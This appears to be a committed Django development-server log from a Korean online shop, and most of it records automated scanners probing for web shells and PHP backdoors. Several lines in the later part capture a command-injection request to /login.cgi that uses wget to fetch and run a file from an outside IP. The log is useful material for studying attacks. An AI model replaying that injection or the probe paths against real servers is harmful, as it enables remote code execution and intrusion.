+[14/Aug/2018 23:53:26] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%ED%95%B4%EA%B8%88_150.png HTTP/1.1" 200 962166
+[14/Aug/2018 23:53:27] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%82%B0%EC%A1%B0_%EA%B0%80%EC%95%BC%EA%B8%88_300.png HTTP/1.1" 200 2061638
+[14/Aug/2018 23:53:27] "GET /static/shop/assets/banner1.png HTTP/1.1" 200 1429918
+[14/Aug/2018 23:53:27] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_18%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_250.png HTTP/1.1" 200 2136101
+[14/Aug/2018 23:53:27] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_25%ED%98%84_%EA%B0%80%EC%95%BC%EA%B8%88_500.png HTTP/1.1" 200 2973646
+[14/Aug/2018 23:53:27] "GET /static/shop/assets/m2_cont_1.png HTTP/1.1" 200 461965
+[14/Aug/2018 23:53:27] "GET /media/Products/mainImg/%ED%8F%AC%EB%A7%B7%EB%B3%80%ED%99%98_%EC%96%91%EA%B8%88250.png HTTP/1.1" 200 3326137
+[14/Aug/2018 23:53:27] "GET /static/shop/assets/m2_cont_2.png HTTP/1.1" 200 483239
+[14/Aug/2018 23:53:27] "GET /static/shop/assets/m2_cont_3.png HTTP/1.1" 200 520911
+[14/Aug/2018 23:53:27] "GET /static/shop/assets/map.png HTTP/1.1" 200 397536
+[14/Aug/2018 23:53:28] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EB%AA%85%EC%A3%BC%EC%8B%A430.png HTTP/1.1" 200 3180856
+[14/Aug/2018 23:53:28] "GET /media/Products/mainImg/%EA%B1%B0%EB%AC%B8%EA%B3%A0_%EC%95%88%EC%A1%B115.png HTTP/1.1" 200 3499459
+Not Found: /favicon.ico
+[14/Aug/2018 23:53:28] "GET /favicon.ico HTTP/1.1" 404 5619
+Not Found: /banner2.png
+[14/Aug/2018 23:53:31] "GET /banner2.png HTTP/1.1" 404 5619
+Not Found: /banner1.png
+[14/Aug/2018 23:53:33] "GET /banner1.png HTTP/1.1" 404 5619
+Traceback (most recent call last):
+  File "/usr/lib/python3.5/socketserver.py", line 625, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.5/socketserver.py", line 354, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.5/socketserver.py", line 681, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.5/dist-packages/django/core/servers/basehttp.py", line 139, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.5/socket.py", line 575, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Forbidden (CSRF cookie not set.): /
+[15/Aug/2018 00:08:26] "PROPFIND / HTTP/1.1" 403 2992
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /webdav/
+[15/Aug/2018 00:08:26] "GET /webdav/ HTTP/1.1" 400 58860
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /help.php
+[15/Aug/2018 00:08:26] "GET /help.php HTTP/1.1" 400 58981
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /java.php
+[15/Aug/2018 00:08:26] "GET /java.php HTTP/1.1" 400 58981
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /_query.php
+[15/Aug/2018 00:08:26] "GET /_query.php HTTP/1.1" 400 59003
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /db_cts.php
+[15/Aug/2018 00:08:30] "GET /db_cts.php HTTP/1.1" 400 59003
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /db_pma.php
+[15/Aug/2018 00:08:30] "GET /db_pma.php HTTP/1.1" 400 59003
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /logon.php
+[15/Aug/2018 00:08:30] "GET /logon.php HTTP/1.1" 400 58992
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /help-e.php
+[15/Aug/2018 00:08:30] "GET /help-e.php HTTP/1.1" 400 59003
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /log.php
+[15/Aug/2018 00:08:34] "GET /log.php HTTP/1.1" 400 58970
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /desktop.ini.php
+[15/Aug/2018 00:08:34] "GET /desktop.ini.php HTTP/1.1" 400 59058
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /x.php
+[15/Aug/2018 00:08:34] "GET /x.php HTTP/1.1" 400 58948
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /z.php
+[15/Aug/2018 00:08:34] "GET /z.php HTTP/1.1" 400 58948
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /lala.php
+[15/Aug/2018 00:08:34] "GET /lala.php HTTP/1.1" 400 58981
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /lala-dpr.php
+[15/Aug/2018 00:08:38] "GET /lala-dpr.php HTTP/1.1" 400 59025
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wpo.php
+[15/Aug/2018 00:08:38] "GET /wpo.php HTTP/1.1" 400 58970
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /text.php
+[15/Aug/2018 00:08:38] "GET /text.php HTTP/1.1" 400 58981
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wp-config.php
+[15/Aug/2018 00:08:38] "GET /wp-config.php HTTP/1.1" 400 59036
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /muhstik.php
+[15/Aug/2018 00:08:38] "GET /muhstik.php HTTP/1.1" 400 59014
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /muhstiks.php
+[15/Aug/2018 00:08:42] "GET /muhstiks.php HTTP/1.1" 400 59025
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /muhstik-dpr.php
+[15/Aug/2018 00:08:42] "GET /muhstik-dpr.php HTTP/1.1" 400 59058
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /lol.php
+[15/Aug/2018 00:08:42] "GET /lol.php HTTP/1.1" 400 58970
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /uploader.php
+[15/Aug/2018 00:08:42] "GET /uploader.php HTTP/1.1" 400 59025
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cmx.php
+[15/Aug/2018 00:08:46] "GET /cmx.php HTTP/1.1" 400 58970
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cmv.php
+[15/Aug/2018 00:08:46] "GET /cmv.php HTTP/1.1" 400 58970
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cmdd.php
+[15/Aug/2018 00:08:46] "GET /cmdd.php HTTP/1.1" 400 58981
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cmd.php
+[15/Aug/2018 00:08:46] "GET /cmd.php HTTP/1.1" 400 58970
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /shell.php
+[15/Aug/2018 00:08:46] "GET /shell.php HTTP/1.1" 400 58992
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /appserv.php
+[15/Aug/2018 00:08:50] "GET /appserv.php HTTP/1.1" 400 59014
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wuwu11.php
+[15/Aug/2018 00:08:50] "POST /wuwu11.php HTTP/1.1" 400 59229
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xw.php
+[15/Aug/2018 00:08:50] "POST /xw.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xw1.php
+[15/Aug/2018 00:08:54] "POST /xw1.php HTTP/1.1" 400 59196
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /9678.php
+[15/Aug/2018 00:08:58] "POST /9678.php HTTP/1.1" 400 59207
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wc.php
+[15/Aug/2018 00:08:58] "POST /wc.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xx.php
+[15/Aug/2018 00:09:02] "POST /xx.php HTTP/1.1" 400 59187
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /s.php
+[15/Aug/2018 00:09:14] "POST /s.php HTTP/1.1" 400 59177
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /w.php
+[15/Aug/2018 00:09:14] "POST /w.php HTTP/1.1" 400 59177
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /sheep.php
+[15/Aug/2018 00:09:26] "POST /sheep.php HTTP/1.1" 400 59218
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /db.init.php
+[15/Aug/2018 00:09:26] "POST /db.init.php HTTP/1.1" 400 59243
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /db_session.init.php
+[15/Aug/2018 00:09:26] "POST /db_session.init.php HTTP/1.1" 400 59331
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /db__.init.php
+[15/Aug/2018 00:09:38] "POST /db__.init.php HTTP/1.1" 400 59265
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wp-admins.php
+[15/Aug/2018 00:09:38] "POST /wp-admins.php HTTP/1.1" 400 59511
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /m.php
+[15/Aug/2018 00:09:50] "POST /m.php?pbid=open HTTP/1.1" 400 59779
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /mx.php
+[15/Aug/2018 00:09:54] "POST /mx.php HTTP/1.1" 400 59186
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wshell.php
+[15/Aug/2018 00:09:54] "POST /wshell.php HTTP/1.1" 400 59231
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xshell.php
+[15/Aug/2018 00:09:54] "POST /xshell.php HTTP/1.1" 400 59231
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qq.php
+[15/Aug/2018 00:09:54] "POST /qq.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /conflg.php
+[15/Aug/2018 00:09:55] "POST /conflg.php HTTP/1.1" 400 59234
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /lindex.php
+[15/Aug/2018 00:09:55] "POST /lindex.php HTTP/1.1" 400 59234
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /phpstudy.php
+[15/Aug/2018 00:09:56] "POST /phpstudy.php HTTP/1.1" 400 59251
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /weixiao.php
+[15/Aug/2018 00:09:57] "POST /weixiao.php HTTP/1.1" 400 59246
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /feixiang.php
+[15/Aug/2018 00:09:58] "POST /feixiang.php HTTP/1.1" 400 59258
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /ak47.php
+[15/Aug/2018 00:09:58] "POST /ak47.php HTTP/1.1" 400 59215
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /ak48.php
+[15/Aug/2018 00:10:08] "POST /ak48.php HTTP/1.1" 400 59215
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xiao.php
+[15/Aug/2018 00:10:09] "POST /xiao.php HTTP/1.1" 400 59210
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /yao.php
+[15/Aug/2018 00:10:11] "POST /yao.php HTTP/1.1" 400 59201
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /defect.php
+[15/Aug/2018 00:10:11] "POST /defect.php HTTP/1.1" 400 59234
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /webslee.php
+[15/Aug/2018 00:10:14] "POST /webslee.php HTTP/1.1" 400 59243
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /q.php
+[15/Aug/2018 00:10:24] "POST /q.php HTTP/1.1" 400 59178
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /pe.php
+[15/Aug/2018 00:10:24] "POST /pe.php HTTP/1.1" 400 59188
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /hm.php
+[15/Aug/2018 00:10:34] "POST /hm.php HTTP/1.1" 400 59186
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cainiao.php
+[15/Aug/2018 00:10:38] "POST /cainiao.php HTTP/1.1" 400 59247
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /zuoshou.php
+[15/Aug/2018 00:10:38] "POST /zuoshou.php HTTP/1.1" 400 59242
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /zuo.php
+[15/Aug/2018 00:10:38] "POST /zuo.php HTTP/1.1" 400 59198
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /aotu.php
+[15/Aug/2018 00:10:50] "POST /aotu.php HTTP/1.1" 400 59213
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /cmd.php
+[15/Aug/2018 00:10:50] "POST /cmd.php HTTP/1.1" 400 59198
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /bak.php
+[15/Aug/2018 00:10:54] "POST /bak.php HTTP/1.1" 400 59198
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /system.php
+[15/Aug/2018 00:10:54] "POST /system.php HTTP/1.1" 400 59231
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /l7.php
+[15/Aug/2018 00:10:55] "POST /l7.php HTTP/1.1" 400 59187
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /l8.php
+[15/Aug/2018 00:11:06] "POST /l8.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qaq.php
+[15/Aug/2018 00:11:06] "POST /qaq.php HTTP/1.1" 400 59196
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /q.php
+[15/Aug/2018 00:11:06] "POST /q.php HTTP/1.1" 400 59174
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /56.php
+[15/Aug/2018 00:11:07] "POST /56.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /mz.php
+[15/Aug/2018 00:11:10] "POST /mz.php HTTP/1.1" 400 59186
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xx.php
+[15/Aug/2018 00:11:10] "POST /xx.php HTTP/1.1" 400 59186
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qaq.php
+[15/Aug/2018 00:11:18] "POST /qaq.php HTTP/1.1" 400 59196
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qaq.php
+[15/Aug/2018 00:11:20] "POST /qaq.php HTTP/1.1" 400 59196
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /yumo.php
+[15/Aug/2018 00:11:22] "POST /yumo.php HTTP/1.1" 400 59210
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /min.php
+[15/Aug/2018 00:11:25] "POST /min.php HTTP/1.1" 400 59200
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wan.php
+[15/Aug/2018 00:11:27] "POST /wan.php HTTP/1.1" 400 59200
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /wanan.php
+[15/Aug/2018 00:11:38] "POST /wanan.php HTTP/1.1" 400 59222
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /ssaa.php
+[15/Aug/2018 00:11:38] "POST /ssaa.php HTTP/1.1" 400 59207
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qq.php
+[15/Aug/2018 00:11:42] "POST /qq.php HTTP/1.1" 400 59186
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /aw.php
+[15/Aug/2018 00:11:46] "POST /aw.php HTTP/1.1" 400 59186
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /12.php
+[15/Aug/2018 00:11:46] "POST /12.php HTTP/1.1" 400 59191
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /hh.php
+[15/Aug/2018 00:11:50] "POST /hh.php HTTP/1.1" 400 59188
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /ak.php
+[15/Aug/2018 00:11:50] "POST /ak.php HTTP/1.1" 400 59188
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /ip.php
+[15/Aug/2018 00:11:54] "POST /ip.php HTTP/1.1" 400 59188
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /infoo.php
+[15/Aug/2018 00:12:06] "POST /infoo.php HTTP/1.1" 400 59219
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qq.php
+[15/Aug/2018 00:12:06] "POST /qq.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qwe.php
+[15/Aug/2018 00:12:18] "POST /qwe.php HTTP/1.1" 400 59196
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /1213.php
+[15/Aug/2018 00:12:18] "POST /1213.php HTTP/1.1" 400 59207
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /post.php
+[15/Aug/2018 00:12:19] "POST /post.php HTTP/1.1" 400 59209
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /h1.php
+[15/Aug/2018 00:12:22] "POST /h1.php HTTP/1.1" 400 59185
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /test.php
+[15/Aug/2018 00:12:22] "POST /test.php HTTP/1.1" 400 59211
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /3.php
+[15/Aug/2018 00:12:22] "POST /3.php HTTP/1.1" 400 59176
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xiaoma.php
+[15/Aug/2018 00:12:34] "POST /xiaoma.php HTTP/1.1" 400 59231
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /xiaomar.php
+[15/Aug/2018 00:12:34] "POST /xiaomar.php HTTP/1.1" 400 59242
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /qq.php
+[15/Aug/2018 00:12:34] "POST /qq.php HTTP/1.1" 400 59187
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /data.php
+[15/Aug/2018 00:12:38] "POST /data.php HTTP/1.1" 400 59209
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /log.php
+[15/Aug/2018 00:12:38] "POST /log.php HTTP/1.1" 400 59196
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /fack.php
+[15/Aug/2018 00:12:50] "POST /fack.php HTTP/1.1" 400 59208
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /angge.php
+[15/Aug/2018 00:12:50] "POST /angge.php HTTP/1.1" 400 59222
+[15/Aug/2018 00:45:34] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Aug/2018 00:45:34] " " 400 -
+[15/Aug/2018 00:45:42] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Aug/2018 00:45:42] " " 400 -
+[15/Aug/2018 00:45:51] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Aug/2018 00:45:51] " " 400 -
+Invalid HTTP_HOST header: '5.188.210.12'. You may need to add '5.188.210.12' to ALLOWED_HOSTS.
+Bad Request: /http:/5.188.210.12/echo.php
+[15/Aug/2018 00:48:05] "GET http://5.188.210.12/echo.php HTTP/1.1" 400 60121
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 01:49:57] "GET / HTTP/1.1" 400 59354
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 01:52:20] "GET / HTTP/1.1" 400 59187
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[15/Aug/2018 02:16:55] "GET /robots.txt HTTP/1.1" 400 59479
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 02:16:55] "GET / HTTP/1.1" 400 59539
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 02:56:57] "GET / HTTP/1.1" 400 58994
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 02:57:15] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 03:04:06] "GET / HTTP/1.1" 400 58768
+Not Found: /login.cgi
+[15/Aug/2018 03:18:32] "GET /login.cgi?cli=aa%20aa%27;wget%20http://212.237.32.62/k%20-O%20-%3E%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 404 5719
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 04:09:28] "GET / HTTP/1.1" 400 58776
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 04:17:43] "GET / HTTP/1.0" 400 58768
+[15/Aug/2018 04:17:58] "GET / HTTP/1.1" 200 6127
+[15/Aug/2018 04:17:58] "GET /static/shop/js/javascript.js HTTP/1.1" 200 5130
+Not Found: /login.cgi
+[15/Aug/2018 04:57:16] "GET /login.cgi?cli=aa%20aa%27;wget%20http://212.237.32.62/k%20-O%20-%3E%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 404 5719
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 05:02:48] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: '58.227.42.219:80'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 05:02:48] "GET / HTTP/1.1" 400 58770
+Invalid HTTP_HOST header: 'www.minsokgukak.com'. You may need to add 'www.minsokgukak.com' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 05:05:05] "GET / HTTP/1.1" 400 59356
+Not Found: /login.cgi
+[15/Aug/2018 05:15:02] "GET /login.cgi?cli=aa%20aa%27;wget%20http://212.237.32.62/k%20-O%20-%3E%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 404 5719
+[15/Aug/2018 05:18:48] "GET / HTTP/1.0" 200 6127
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Aug/2018 05:35:09] "GET / HTTP/1.1" 400 58927
+Invalid HTTP_HOST header: '58.227.42.219'. You may need to add '58.227.42.219' to ALLOWED_HOSTS.
